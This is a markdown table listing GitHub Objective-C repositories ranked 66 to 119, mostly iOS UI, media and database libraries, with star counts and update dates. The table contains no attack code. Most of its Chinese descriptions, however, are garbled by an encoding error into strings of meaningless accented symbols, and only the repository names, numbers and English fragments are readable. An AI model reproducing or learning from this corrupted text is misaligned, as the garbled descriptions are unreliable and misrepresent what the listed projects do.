|66|[czl0325/ZLCollectionView](https://github.com/czl0325/ZLCollectionView)|‰∏∫Â∫îÂØπÁ±ª‰ººÊ∑òÂÆùÈ¶ñÈ°µÔºå‰∫¨‰∏úÈ¶ñÈ°µÔºåÂõΩÁæéÈ¶ñÈ°µÁ≠âÂ§çÊùÇÂ∏ÉÂ±ÄËÄåÂÜôÁöÑCollectionview„ÄÇÂü∫‰∫éUICollectionViewÂÆûÁé∞ÔºåÁõÆÂâçÊîØÊåÅÊ†áÁ≠æÂ∏ÉÂ±ÄÔºåÂàóÂ∏ÉÂ±ÄÔºåÁôæÂàÜÊØîÂ∏ÉÂ±ÄÔºåÂÆö‰ΩçÂ∏ÉÂ±ÄÔºåÂ°´ÂÖÖÂºèÂ∏ÉÂ±ÄÔºåÁÄëÂ∏ÉÊµÅÂ∏ÉÂ±ÄÁ≠â„ÄÇÊîØÊåÅÁ∫µÂêëÂ∏ÉÂ±ÄÂíåÊ®™ÂêëÂ∏ÉÂ±ÄÔºåÂèØ‰ª•Ê†πÊçÆ‰∏çÂêåÁöÑsectionËÆæÁΩÆ‰∏çÂêåÁöÑÂ∏ÉÂ±ÄÔºåÊîØÊåÅÊãñÂä®cellÔºåÂ§¥ÈÉ®ÊÇ¨ÊµÆÔºåËÆæÁΩÆsectionËÉåÊôØËâ≤ÂíåËá™ÂÆö‰πâsectionËÉåÊôØviewÔºåÂêëËá™ÂÆö‰πâËÉåÊôØview‰º†ÈÄíËá™ÂÆö‰πâÊñπÊ≥ï„ÄÇÂÆûÁé∞‰∫ÜÁîµÂΩ±ÈÄâÂ∫ßÁ≠âÈ´òÈöæÂ∫¶ÁöÑÂ∏ÉÂ±Ä„ÄÇ|734|Objective-C|09/08|
|67|[Tencent/vap](https://github.com/Tencent/vap)|VAPÊòØ‰ºÅÈπÖÁîµÁ´ûÂºÄÂèëÔºåÁî®‰∫éÊí≠ÊîæÁâπÊïàÂä®ÁîªÁöÑÂÆûÁé∞ÊñπÊ°à„ÄÇÂÖ∑ÊúâÈ´òÂéãÁº©Áéá„ÄÅÁ°¨‰ª∂Ëß£Á†ÅÁ≠â‰ºòÁÇπ„ÄÇÂêåÊó∂ÊîØÊåÅ iOS,Android,Web Âπ≥Âè∞„ÄÇ|732|Objective-C|10/29|
|68|[lixiang1994/LEETheme](https://github.com/lixiang1994/LEETheme)|‰ºòÈõÖÁöÑ‰∏ªÈ¢òÁÆ°ÁêÜÂ∫ì- ‰∏ÄË°å‰ª£Á†ÅÂÆåÊàêÂ§öÊ†∑ÂºèÂàáÊç¢|728|Objective-C|09/01|
|69|[LoSenTrad/LSTPopView](https://github.com/LoSenTrad/LSTPopView)|LSTPopView iOS‰∏áËÉΩÂºπÁ™ó (QQÁæ§:1045568246 ÂæÆ‰ø°:a_LSTKit)|724|Objective-C|08/11|
|70|[wsl2ls/iOS_Tips](https://github.com/wsl2ls/iOS_Tips)|iOSÁöÑ‰∏Ä‰∫õÁ§∫‰æãÔºåÊåÅÁª≠Êõ¥Êñ∞‰∏≠Ôºö1„ÄÅAVFoundation È´ò‰ªøÂæÆ‰ø°Áõ∏Êú∫ÊãçÊëÑÂíåÁºñËæë 2„ÄÅAVFoundation ‰∫∫ËÑ∏Ê£ÄÊµã„ÄÅÂÆûÊó∂Êª§Èïú„ÄÅÈü≥ËßÜÈ¢ëÁºñËß£Á†Å„ÄÅGPUImageÊ°ÜÊû∂ÁöÑ‰ΩøÁî®Á≠âÈü≥ËßÜÈ¢ëÁõ∏ÂÖ≥ÂÜÖÂÆπ    3„ÄÅOpenGLES    4„ÄÅLeetCodeÁÆóÊ≥ïÁªÉ‰π†   5„ÄÅiOS CrashÈò≤Êä§    6„ÄÅWKWebViewÁõ∏ÂÖ≥ÁöÑÂÜÖÂÆπ  Á≠â........|720|Objective-C|10/29|
|71|[skx926/KSPhotoBrowser](https://github.com/skx926/KSPhotoBrowser)|A beautiful photo browser with interactive dismissal animation.‰∏Ä‰∏™Â∞èËÄåÁæéÁöÑÂõæÁâáÊµèËßàÂô®„ÄÇ|709|Objective-C|10/04|
|72|[svga/SVGAPlayer-iOS](https://github.com/svga/SVGAPlayer-iOS)|Similar to Lottie. Render After Effects / Animate CC (Flash) animations natively on Android and iOS, Web.  ‰ΩøÁî® SVGAPlayer Âú® Android„ÄÅiOS„ÄÅWeb‰∏≠Êí≠Êîæ After Effects / Animate CC (Flash) Âä®Áîª„ÄÇ|705|Objective-C|10/15|
|73|[CRAnimation/CRBoxInputView](https://github.com/CRAnimation/CRBoxInputView)|Verify code input view. Support security type for password.Áü≠‰ø°È™åËØÅÁ†ÅËæìÂÖ•Ê°ÜÔºåÊîØÊåÅÂØÜÊñáÊ®°Âºè|697|Objective-C|06/11|
|74|[TonyReet/TYSnapshotScroll](https://github.com/TonyReet/TYSnapshotScroll)|‰∏ÄÂè•‰ª£Á†Å‰øùÂ≠òÊà™ÂõæÔºåÂ∞Ü UIScrollView UITableView UICollectionView UIWebView WKWebView  ÁΩëÈ°µ ‰øùÂ≠ò ‰∏∫ ÈïøÂõæ Êü•Áúã„ÄÇSave the scroll view page as an image,support UIScrollView,UITableView,UICollectionView,UIWebView,WKWebView.(Support iOS13)|689|Objective-C|08/27|
|75|[yiplee/YPNavigationBarTransition](https://github.com/yiplee/YPNavigationBarTransition)|A Full functional UINavigationBar framework for making bar transition more natural! You don't need to call any UINavigationBar api, implementing YPNavigationBarConfigureStyle protocol for your view controller instead.                ÔºàÁ±ª‰ººÂæÆ‰ø° iOS Navigation Bar ÁöÑÂàáÊç¢ÊñπÊ°àÔºâ|674|Objective-C|06/28|
|76|[tencentyun/MLVBSDK](https://github.com/tencentyun/MLVBSDK)|ÁßªÂä®Áõ¥Êí≠ SDKÔºåÂõΩÂÜÖ‰∏ãËΩΩÈïúÂÉèÔºö|617|Objective-C|10/26|
|77|[pikacode/EBBannerView](https://github.com/pikacode/EBBannerView)|Just 1 lineÔºöShow a banner the same as iOS  9~13 Notification, or show a custom view. Âè™ÈúÄ‰∏ÄË°å‰ª£Á†ÅÔºöÂ±ïÁ§∫Ë∑ü iOS Á≥ªÁªü‰∏ÄÊ†∑ÁöÑÊé®ÈÄÅÈÄöÁü•Ê®™ÂπÖÔºåÊàñÂ±ïÁ§∫‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑ view„ÄÇÊîØÊåÅÊ®™Â±è„ÄÅËá™Âä®ÈÄÇÂ∫îÂêÑÁßçÊú∫Âûã„ÄÅËá™Âä®Â£∞Èü≥/ÈúáÂä®„ÄÇ|607|Objective-C|04/24|
|78|[QuintGao/GKNavigationBarViewController](https://github.com/QuintGao/GKNavigationBarViewController)|iOSËá™ÂÆö‰πâÂØºËà™Ê†è-ÂØºËà™Ê†èËÅîÂä®|597|Objective-C|10/23|
|79|[HeathWang/HWPanModal](https://github.com/HeathWang/HWPanModal)|HWPanModal presents controller from bottom and drag to dismiss, high customize. iOS13 default modalPresentationStyle. ‰ªªÊÑèÂΩ¢ÂºèÁöÑÂ∫ïÈÉ®ÂºπÊ°ÜÂä®ÁîªÔºõÂ§¥Êù°„ÄÅÁü•‰πé„ÄÅÊäñÈü≥ÂºπÂá∫ËØÑËÆ∫ÊïàÊûúÔºõÂú∞ÂõæÊµÆÂ±ÇÔºåiOS13 presentÈªòËÆ§Ê®°ÊÄÅÊïàÊûú„ÄÇ|591|Objective-C|10/20|
|80|[netyouli/WHC_ModelSqliteKit](https://github.com/netyouli/WHC_ModelSqliteKit)|‰∏ì‰∏öÁöÑORMÊï∞ÊçÆÂ∫ìÊìç‰ΩúÂºÄÊ∫êÂ∫ìÔºåÁ∫øÁ®ãÂÆâÂÖ®ÔºåÈ´òÊÄßËÉΩÊ®°ÂûãÂØπË±°Â≠òÂÇ®SqliteÂºÄÊ∫êÂ∫ìÔºåÁúüÊ≠£ÂÆûÁé∞‰∏ÄË°å‰ª£Á†ÅÊìç‰ΩúÊï∞ÊçÆÂ∫ìÔºåËÆ©Êï∞ÊçÆÂ∫ìÂ≠òÂÇ®ÂèòÂæóÁÆÄÂçï Professional database storage solutions, thread safe, high-performance model object storage Sqlite open source library, realize one line of code database operation, simple database storage|590|Objective-C|05/31|
|81|[shabake/GHDropMenuDemo](https://github.com/shabake/GHDropMenuDemo)|:sunny::sunny: ‰ªø‰∫¨‰∏ú/ÁæéÂõ¢ÁîµÂïÜÁ≠õÈÄâËèúÂçï ÁîµÂïÜÁ≠õÈÄâËèúÂçï ÁîµÂïÜÈÄöÁî®Á≠õÈÄâËèúÂçï:tennis::tennis: Imitation Jingdong / Meituan e-commerce screening menu E-commerce screening menu E-commerce general screening menu|580|Objective-C|08/06|
|82|[AllLuckly/LBLaunchImageAd](https://github.com/AllLuckly/LBLaunchImageAd)|iOSÂºÄÂèëËΩªÈáèÁ∫ßÂêØÂä®ÂπøÂëäÔºåÂä®ÊÄÅËé∑ÂèñÁΩëÁªúÂêØÂä®ÂõæÁâáÔºåÂÖ∑ÊúâÊ∏êÂèòÁöÑÂêØÂä®Âä®ÁîªÔºåÊîØÊåÅÂçäÂ±èÂíåÂÖ®Â±èÔºåÁ±ª‰ººÁôæÂ∫¶sspÂπøÂëäÂíåÂπøÁÇπÈÄöÁöÑÂπøÂëä„ÄÇÊîØÊåÅÂπøÂëäÁÇπÂáªÁ≠âÔºåÈõÜÊàêÈùûÂ∏∏ÁöÑÊñπ‰æø„ÄÇÊ¨¢Ëøé‰ΩøÁî®ÔºåÂ•ΩÁî®ËØ∑star|556|Objective-C|04/10|
|83|[MacOMNI/MACProject](https://github.com/MacOMNI/MACProject)|ËøôÊòØ‰∏Ä‰∏™Áî® Objective-C ÂÜôÁöÑ iOS ËΩªÈáèÁ∫ßÊ°ÜÊû∂ÔºåÊó®Âú®Âø´ÈÄüÊûÑÂª∫ iOS AppÔºåÊ¨¢Ëøé Star|544|Objective-C|06/10|
|84|[wwmz/WMZDialog](https://github.com/wwmz/WMZDialog)|ÂäüËÉΩÊúÄÂ§öÊ†∑ÂºèÊúÄÂ§öÁöÑÂºπÁ™óÔºåÊîØÊåÅÊôÆÈÄö/ÂæÆ‰ø°Â∫ïÈÉ®/Êó•Êúü/Âú∞Âå∫/Êó•ÂéÜ/ÈÄâÊã©/ÁºñËæë/ÂàÜ‰∫´/ËèúÂçï/Ëá™ÂÆö‰πâÂºπÁ™óÁ≠â,ÊîØÊåÅÂ§öÁßçÂä®Áîª,ÈìæÂºèÁºñÁ®ãË∞ÉÁî®(Pop-up windows with the most functions and styles, support normal/WeChat bottom/date/region/calendar/select/edit/share/menu/custom pop-up windows, etc., support multiple animations, chain programming calls)|532|Objective-C|10/21|
|85|[anyrtcIO-Community/anyRTC-RTMPC-iOS](https://github.com/anyrtcIO-Community/anyRTC-RTMPC-iOS)|Âü∫‰∫éRTMPÂíåRTCÊ∑∑ÂêàÂºïÊìéÁöÑËßÜÈ¢ëËøûÈ∫¶‰∫íÂä®Áõ¥Êí≠|527|Objective-C|02/28|
|86|[gaojunquan/JQFMDB](https://github.com/gaojunquan/JQFMDB)|FMDBÁöÑÂ∞ÅË£Ö,Êìç‰ΩúÁÆÄÂçï,Á∫øÁ®ãÂÆâÂÖ®,Êâ©Â±ïÊÄßÂº∫,Áõ¥Êé•Êìç‰ΩúmodelÊàñdictionary|523|Objective-C|04/12|
|87|[ihoudf/DFPlayer](https://github.com/ihoudf/DFPlayer)|ÁÆÄÂçïÁÅµÊ¥ªÁöÑiOSÈü≥È¢ëÊí≠ÊîæÁªÑ‰ª∂„ÄÇÂü∫‰∫éAVPlayerÔºåÊîØÊåÅÊú¨Âú∞ÂíåËøúÁ®ãÈü≥È¢ëÊí≠ÊîæÔºåÂÖ∑ÊúâÁºìÂ≠ò„ÄÅËÄ≥Êú∫Á∫øÊéß„ÄÅÈîÅÂ±èÂíåÊéßÂà∂‰∏≠ÂøÉ‰ø°ÊÅØÂ±ïÁ§∫„ÄÅÂçïÊõ≤È°∫Â∫èÈöèÊú∫Êí≠Êîæ„ÄÅÂÄçÈÄüÊí≠Êîæ„ÄÅÊ≠åËØçÂêåÊ≠•Á≠âÈü≥È¢ëÊí≠ÊîæÂô®ÂäüËÉΩÔºåDFPlayerÂ∞ÅË£Ö‰∫ÜÁºìÂÜ≤Êù°„ÄÅËøõÂ∫¶Êù°„ÄÅÊí≠ÊîæÊöÇÂÅúÊåâÈíÆ„ÄÅ‰∏ã‰∏ÄÈ¶ñÊåâÈíÆ„ÄÅ‰∏ä‰∏ÄÈ¶ñÊåâÈíÆ„ÄÅÊí≠ÊîæÊ®°ÂºèÊåâÈíÆ„ÄÅÊ≠åËØçÂêåÊ≠•ÁöÑtableviewÁ≠âUIÊéß‰ª∂Ôºå‰∏ÄË°å‰ª£Á†ÅÂ∏ÉÂ±ÄÂç≥ÂèØÂÆûÁé∞Áõ∏Â∫îÂäüËÉΩ„ÄÇ|513|Objective-C|04/30|
|88|[pili-engineering/PLMediaStreamingKit](https://github.com/pili-engineering/PLMediaStreamingKit)|PLMediaStreamingKit ÊòØ‰∏ÉÁâõÊé®Âá∫ÁöÑ‰∏ÄÊ¨æÈÄÇÁî®‰∫é iOS Âπ≥Âè∞ÁöÑÊé®ÊµÅ SDKÔºåÊîØÊåÅ RTMP Êé®ÊµÅÔºåh.264 Âíå AAC ÁºñÁ†ÅÔºåÁ°¨Áºñ„ÄÅËΩØÁºñÊîØÊåÅ„ÄÇÂÖ∑Êúâ‰∏∞ÂØåÁöÑÊï∞ÊçÆÂíåÁä∂ÊÄÅÂõûË∞ÉÔºåÊñπ‰æøÁî®Êà∑Ê†πÊçÆËá™Â∑±ÁöÑ‰∏öÂä°ÂÆöÂà∂ÂåñÂºÄÂèë„ÄÇÂÖ∑ÊúâÁõ¥Êí≠Âú∫ÊôØ‰∏ãÁöÑÈáçË¶ÅÂäüËÉΩÔºåÂ¶ÇÔºöÁæéÈ¢ú„ÄÅËÉåÊôØÈü≥‰πê„ÄÅÊ∞¥Âç∞Á≠âÂäüËÉΩ„ÄÇ|511|Objective-C|09/18|
|89|[ksvc/KSYMediaPlayer_iOS](https://github.com/ksvc/KSYMediaPlayer_iOS)|ÈáëÂ±±‰∫ëiOSÊí≠ÊîæSDKÔºàKSYUN Live Streaming player SDKÔºâÔºåÊîØÊåÅRTMP HTTP-FLV HLS ÂçèËÆÆÔºàsupporting RTMP HTTP-FLV HLS protocolÔºâÔºåÁõ¥Êí≠Âª∂Êó∂2-3ÁßíÔºàLiving delay 2 or 3 secondsÔºâ|495|Objective-C|05/12|
|90|[Rogue24/JPImageresizerView](https://github.com/Rogue24/JPImageresizerView)|‰∏Ä‰∏™‰∏ìÈó®Ë£ÅÂâ™ÂõæÁâá„ÄÅGIF„ÄÅËßÜÈ¢ëÁöÑËΩÆÂ≠êüòã ÁÆÄÂçïÊòìÁî®„ÄÅÂäüËÉΩ‰∏∞ÂØå‚òïÔ∏èÔºàÈ´òËá™Áî±Â∫¶ÁöÑÂèÇÊï∞ËÆæÂÆö„ÄÅÊîØÊåÅÊóãËΩ¨ÂíåÈïúÂÉèÁøªËΩ¨„ÄÅËíôÁâà„ÄÅÂéãÁº©Á≠âÔºâÔºåËÉΩÊª°Ë∂≥ÁªùÂ§ßÈÉ®ÂàÜË£ÅÂâ™ÁöÑÈúÄÊ±Ç„ÄÇ|462|Objective-C|10/25|
|91|[DKJone/DKWechatHelper](https://github.com/DKJone/DKWechatHelper)|‰∏çÊ≠¢‰∫éÊä¢Á∫¢ÂåÖÔºåÂäüËÉΩ‰∏∞ÂØåÁöÑÂæÆ‰ø°Êèí‰ª∂„ÄÇ|460|Objective-C|10/16|
|92|[CoderMJLee/MJAppTools](https://github.com/CoderMJLee/MJAppTools)|„ÄêË∂äÁã±-ÈÄÜÂêë„ÄëÂ§ÑÁêÜiOS APP‰ø°ÊÅØÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑|449|Objective-C|08/28|
|93|[xiangwangfeng/M80ImageMerger](https://github.com/xiangwangfeng/M80ImageMerger)|Êà™ÂõæËá™Âä®ÊãºÊé•Â∞èÂ∑•ÂÖ∑|434|Objective-C|10/16|
|94|[loyinglin/LearnVideoToolBox](https://github.com/loyinglin/LearnVideoToolBox)|Èü≥ËßÜÈ¢ëÁöÑÂÆûË∑µÔºåh264ÁöÑÁºñËß£Á†ÅÔºåaacÁöÑÁºñËß£Á†ÅÔºåAudio UnitÂêÑÁßçÂÆûË∑µ|431|Objective-C|03/17|
|95|[wwmz/WMZDropDownMenu](https://github.com/wwmz/WMZDropDownMenu)|üåπ‰∏Ä‰∏™ËÉΩÂá†‰πéÂÆûÁé∞ÊâÄÊúâAppÂêÑÁßçÁ±ªÂûãÁ≠õÈÄâËèúÂçïÁöÑÊéß‰ª∂,ÂèØÊÇ¨ÊµÆ,ÁõÆÂâçÂ∑≤ÂÆûÁé∞Èó≤È±º/ÁæéÂõ¢/BossÁõ¥ËÅò/‰∫¨‰∏ú/È•ø‰∫Ü‰πà/Ê∑òÂÆù/ÊãºÂ§öÂ§ö/Ëµ∂ÈõÜÁΩë/ÁæéÂõæÂ§ñÂçñÁ≠âÁ≠âÁöÑÁ≠õÈÄâËèúÂçï,ÂèØ‰ª•Ëá™Áî±Ë∞ÉÁî®‰ª£ÁêÜÂÆûÁé∞Ëá™Â∑±ÊÉ≥ÁªÑË£ÖÁöÑÁ≠õÈÄâÂäüËÉΩÂíåUI,‰∏îÊéß‰ª∂ÁöÑÁîüÂëΩÂë®ÊúüËá™Âä®ÁÆ°ÁêÜ,ÊÇ¨ÊµÆËá™Âä®ÁÆ°ÁêÜüåπ(A control that can implement almost all types of filtering menus of all apps)|430|Objective-C|10/28|
|96|[Bonway/BBGestureBack](https://github.com/Bonway/BBGestureBack)|üî•OC and Swift full screen return gestureüî•ÔºàÁ∫ØOC Âíå Á∫ØSwiftÁºñÂÜôÔºåÁ±ªÊ∑òÂÆù„ÄÅ‰∫¨‰∏úÁ≠âÂÖ®Â±èÊªëÂä®ËøîÂõûÊïàÊûúÔºâ|427|Objective-C|07/02|
|97|[maltsugar/RollingNotice](https://github.com/maltsugar/RollingNotice)|ÊâÄÊúâÁöÑÂûÇÂêëÊªöÂ±èËøô‰∏Ä‰∏™Â∫ìÂ∞±Â§ü‰∫ÜÔºÅÔºÅÔºÅÊªöÂä®ÂÖ¨Âëä„ÄÅËΩÆÊí≠ÂπøÂëäÔºåÊîØÊåÅÁÅµÊ¥ªËá™ÂÆö‰πâcell„ÄÇÊ∑òÂÆù„ÄÅÂè£Á¢ë„ÄÅ‰∫¨‰∏ú„ÄÅÁæéÂõ¢„ÄÅÂ§©Áå´Á≠âÁ≠â‰∏ÄÂàáÊªöÂä®ÂπøÂëä Roll Notice or Advertising, customize cell as UITableViewCell supported, Swift version is also ready|426|Objective-C|04/15|
|98|[Liaoworking/GHConsole](https://github.com/Liaoworking/GHConsole)|An elegant and easy way to show a console in your app. ‰∏ÄÁßç‰ºòÈõÖÁÆÄÂçïÁöÑÊñπÂºèÂú®app‰∏≠ÊòæÁ§∫ÊéßÂà∂Âè∞„ÄÇ|413|Objective-C|07/03|
|99|[MobClub/ShareSDK-for-iOS](https://github.com/MobClub/ShareSDK-for-iOS)|Âø´Êç∑Â•ΩÁî®ÁöÑÁ§æ‰ºöÂåñÂàÜ‰∫´ÁªÑ‰ª∂ Convenient SDK for SNS Share Feature|412|Objective-C|10/21|
|100|[MustangYM/WeChatICU-ForMac](https://github.com/MustangYM/WeChatICU-ForMac)|MacÁâà‰ºÅ‰∏öÂæÆ‰ø°Ê∂àÊÅØÈò≤Êí§Âõû, ËÅäÂ§©‰ºöËØùÂéªÊ∞¥Âç∞|410|Objective-C|09/20|
|101|[loyinglin/LearnMetal](https://github.com/loyinglin/LearnMetal)|Metal ÂÖ•Èó®ÊïôÁ®ã|408|Objective-C|03/17|
|102|[OpenFlutter/tobias](https://github.com/OpenFlutter/tobias)|AliPay For Flutter.ÊîØ‰ªòÂÆùFlutterÊèí‰ª∂|406|Objective-C|08/12|
|103|[g0v/moedict-webkit](https://github.com/g0v/moedict-webkit)|ËêåÂÖ∏Á∂≤Á´ô|405|Objective-C|10/18|
|104|[SPStore/SPPageMenu](https://github.com/SPStore/SPPageMenu)|ÂàÜÈ°µËèúÂçïÔºåÂäüËÉΩÈùûÂ∏∏ÈΩêÂÖ®ÔºåÊª°Ë∂≥ÁªùÂ§ßÂ§öÊï∞APPÔºåÁÆÄ‰π¶Âú∞ÂùÄ:|397|Objective-C|05/15|
|105|[ziecho/ZYNetworkAccessibility](https://github.com/ziecho/ZYNetworkAccessibility)|ÈíàÂØπ iOS ÁΩëÁªúÊùÉÈôêÁöÑÁõëÊéßÂíåÂà§Êñ≠|397|Objective-C|09/01|
|106|[pili-engineering/PLShortVideoKit](https://github.com/pili-engineering/PLShortVideoKit)|PLShortVideoKit ÊòØ‰∏ÉÁâõÊé®Âá∫ÁöÑ‰∏ÄÊ¨æÈÄÇÁî®‰∫é iOS Âπ≥Âè∞ÁöÑÁü≠ËßÜÈ¢ë SDKÔºåÊèê‰æõ‰∫ÜÂåÖÊã¨ÁæéÈ¢ú„ÄÅÊª§Èïú„ÄÅÊ∞¥Âç∞„ÄÅÊñ≠ÁÇπÂΩïÂà∂„ÄÅÂàÜÊÆµÂõûÂà†„ÄÅËßÜÈ¢ëÁºñËæë„ÄÅÊ∑∑Èü≥ÁâπÊïà„ÄÅËßÜÈ¢ëÂâ™Ëæë„ÄÅÊú¨Âú∞ËΩ¨Á†Å„ÄÅËßÜÈ¢ë‰∏ä‰º†Âú®ÂÜÖÁöÑÂ§öÁßçÂäüËÉΩÔºåÊîØÊåÅÈ´òÂ∫¶ÂÆöÂà∂‰ª•Âèä‰∫åÊ¨°ÂºÄÂèë„ÄÇ|392|Objective-C|10/28|
|107|[SPStore/SPAlertController](https://github.com/SPStore/SPAlertController)|ÊèêÈÜíÂØπËØùÊ°ÜÔºåÈ£éÊ†ºÂíåÂæÆ‰ø°ÂéüÁîüÂá†‰πéÈõ∂ËØØÂ∑Æ„ÄÇÁÆÄ‰π¶Âú∞ÂùÄ:|383|Objective-C|05/06|
|108|[tbl00c/ZZFLEX](https://github.com/tbl00c/ZZFLEX)|‰∏Ä‰∏™ÂÆåÂñÑÁöÑiOSÊïèÊç∑ÂºÄÂèëÊ°ÜÊû∂ÔºåÂü∫‰∫éUIKitÂÆûÁé∞ÔºåÂåÖÂê´Â∏∏Áî®Êéß‰ª∂ÁöÑÈìæÂºèAPIÊãìÂ±ï„ÄÅ‰∏Ä‰∏™Êï∞ÊçÆÈ©±Âä®ÁöÑÂàóË°®Ê°ÜÊû∂„ÄÅ‰∏Ä‰∏™‰∫ã‰ª∂Â§ÑÁêÜÈòüÂàó„ÄÇ|380|Objective-C|09/24|
|109|[lincf0912/LFMediaEditingController](https://github.com/lincf0912/LFMediaEditingController)|Media Editor (ÂõæÁâáÁºñËæë„ÄÅËßÜÈ¢ëÁºñËæë)|378|Objective-C|10/28|
|110|[MxABC/LBXPermission](https://github.com/MxABC/LBXPermission)|iOSÂ∏∏Áî®ÊùÉÈôêËØ∑Ê±ÇÂà§Êñ≠|375|Objective-C|10/15|
|111|[zzyspace/ZYBannerView](https://github.com/zzyspace/ZYBannerView)|ÁÆÄÂçïÊòìÁî®, ÊòæÁ§∫ÂÜÖÂÆπÂÆöÂà∂ÊÄßÂº∫ÁöÑÂèØÂæ™ÁéØËΩÆÊí≠Êéß‰ª∂. ÂèØ‰ª•ÂÆûÁé∞Á±ª‰ººÊ∑òÂÆùÂïÜÂìÅËØ¶ÊÉÖ‰∏≠‰æßÊãâËøõÂÖ•ËØ¶ÊÉÖÈ°µÁöÑÂäüËÉΩ. |372|Objective-C|03/24|
|112|[karosLi/KKJSBridge](https://github.com/karosLi/KKJSBridge)|‰∏ÄÁ´ôÂºèËß£ÂÜ≥ WKWebView ÊîØÊåÅÁ¶ªÁ∫øÂåÖÔºåAjax/Fetch ËØ∑Ê±ÇÔºåË°®ÂçïËØ∑Ê±ÇÂíå Cookie ÂêåÊ≠•ÁöÑÈóÆÈ¢ò (Âü∫‰∫é Ajax HookÔºåFetch Hook Âíå Cookie Hook)|372|Objective-C|10/21|
|113|[sensorsdata/sa-sdk-ios](https://github.com/sensorsdata/sa-sdk-ios)|Á•ûÁ≠ñÊï∞ÊçÆÂÆòÊñπ iOS ÂüãÁÇπ SDKÔºåÊòØ‰∏ÄÊ¨æËΩªÈáèÁ∫ßÁî®‰∫é iOS Á´ØÁöÑÊï∞ÊçÆÈááÈõÜÂüãÁÇπ SDK„ÄÇÁ•ûÁ≠ñÂàÜÊûê iOS SDK ‰∏ç‰ªÖÊúâ‰ª£Á†ÅÂüãÁÇπÂäüËÉΩÔºåËøòÈÄöËøá‰ΩøÁî®ËøêË°åÊó∂Êú∫Âà∂ÔºàRuntimeÔºâ‰∏≠ÁöÑÁõ∏ÂÖ≥ÊäÄÊúØÂÆûÁé∞ iOS Á´ØÁöÑÂÖ®ÂüãÁÇπÔºàÊó†ÂüãÁÇπ„ÄÅÊó†Á†ÅÂüãÁÇπ„ÄÅÊó†ÁóïÂüãÁÇπ„ÄÅËá™Âä®ÂüãÁÇπÔºâ„ÄÅÁÇπÂáªÂõæ„ÄÅÂèØËßÜÂåñÂÖ®ÂüãÁÇπ„ÄÇ|367|Objective-C|10/27|
|114|[QuintGao/GKDYVideo](https://github.com/QuintGao/GKDYVideo)|iOS‰ªøÊäñÈü≥Áü≠ËßÜÈ¢ë|359|Objective-C|05/09|
|115|[2621532542/iOS_NQConfuseTool](https://github.com/2621532542/iOS_NQConfuseTool)|iOS‰ª£Á†ÅÊ∑∑Ê∑Ü(iOS_NQConfuseTool)ÊòØ‰∏ÄÊ¨æËøêË°åÂú®MACOSÂπ≥Âè∞ÁöÑApp„ÄÅÂÆåÁæéÊîØÊåÅOCÂíåSwiftÈ°πÁõÆ‰ª£Á†ÅÁöÑËá™Âä®Ê∑∑Ê∑Ü„ÄÅÊîØÊåÅ„ÄÅÊñá‰ª∂Âêç„ÄÅ‰øÆÊîπËµÑÊ∫êÊñá‰ª∂„ÄÅÁ±ªÂêç„ÄÅÊñπÊ≥ïÂêç„ÄÅÂ±ûÊÄßÂêç„ÄÅÊ∑ªÂä†Ê∑∑Ê∑ÜÂáΩÊï∞ÊñπÊ≥ï‰Ωì„ÄÅÊ∑ªÂä†Ê∑∑Ê∑ÜÂ±ûÊÄß„ÄÅËá™Âä®Ë∞ÉÁî®ÁîüÊàêÁöÑÊ∑∑Ê∑Ü‰ª£Á†ÅÔºåÂäüËÉΩÂº∫Â§ßËÄåÁ®≥ÂÆöÔºåÂÖ®Â±ÄËá™Âä®ÂåñÔºåÂÆâÂÖ®Âä†Âõ∫„ÄÇÈ©¨Áî≤ÂåÖÊ∑∑Ê∑ÜÂ∑•ÂÖ∑ÔºåÊúÄÈáçË¶ÅÁöÑÊòØÂÆåÂÖ®ÂÖçË¥π„ÄÇÔºàÈöèÊú∫ÂçïËØçÊãºÊé•Ôºâ|355|Objective-C|09/12|
|116|[zhu410289616/RHSocketKit](https://github.com/zhu410289616/RHSocketKit)|socketÁΩëÁªúÈÄö‰ø°Ê°ÜÊû∂ Ôºç qq: 410289616  Ôºç  qqÁæ§2: 371293816  qqÁæ§3: 231199626|344|Objective-C|06/25|
|117|[LeoMobileDeveloper/QTEventBus](https://github.com/LeoMobileDeveloper/QTEventBus)|iOS‰∫ã‰ª∂ÊÄªÁ∫øÔºåÊîØÊåÅAppDelegateËß£ËÄ¶ÔºåÊîØÊåÅÂü∫‰∫éÂìçÂ∫îÈìæÁöÑÂ±ÄÈÉ®ÊÄªÁ∫ø|339|Objective-C|06/24|
|118|[sealtalk/sealtalk-ios](https://github.com/sealtalk/sealtalk-ios)|iOS App of SealTalk powered by RongCloud. Âü∫‰∫éËûç‰∫ëÂºÄÂèëÁöÑ iOS ÁâàÂç≥Êó∂ÈÄöËÆØÔºàIMÔºâÂ∫îÁî®Á®ãÂ∫è - Âó®Ë±π„ÄÇ|338|Objective-C|09/21|
|119|[AbuIOSDeveloper/KLine](https://github.com/AbuIOSDeveloper/KLine)|(CAShapelayer + UIBezierPath)ÁªòÂà∂KÁ∫øÊîØÊíëÊ®™Á´ñÂ±èÂàáÊç¢„ÄÅÂà∑Êñ∞„ÄÅÈïøÊåâ„ÄÅÁº©Êîæ„ÄÅmasonryÈÄÇÈÖçÔºåÂÆåÁæéÊîØÊåÅÈáëËûç‰∫ßÂìÅ ÈùûÂ∏∏ÁöÑÊµÅÁïÖÔºåÂç†Áî®ÂÜÖÂ≠òÂ∞ëÔºå‰ΩøÁî®Áü¢ÈáèËøõË°åÂ°´ÂÖÖKÁ∫øÔºåÊåÅÁª≠Êõ¥Êñ∞ÔºåÊúâÈóÆÈ¢òËØ∑Ê∑ªÂä†QQ:2438100263 ÂñúÊ¨¢ÁöÑÂèØ‰ª•Ê∑ªÂä†Áæ§Ôºö362681337|337|Objective-C|02/28|
